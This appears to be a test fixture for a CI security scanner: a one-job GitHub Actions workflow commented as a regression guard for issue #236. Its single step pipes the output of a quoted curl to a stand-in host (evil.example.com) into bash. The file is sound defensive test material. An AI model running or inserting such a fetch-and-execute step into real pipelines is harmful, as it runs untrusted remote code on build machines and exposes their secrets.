# issue #236 regression guard: a curl hidden inside a quoted command
# substitution ("$(curl ...)") IS a remote fetch piped into a shell.
# The echo/printf exemption must check the raw line (curl lives inside
# the quotes, which _visible_line strips), not the quote-stripped form.
# Expected hits: 1 (exfil).
name: ci
on: push
jobs:
  exfil:
    runs-on: ubuntu-24.04
    steps:
      - run: echo "$(curl -s https://evil.example.com/payload)" | bash
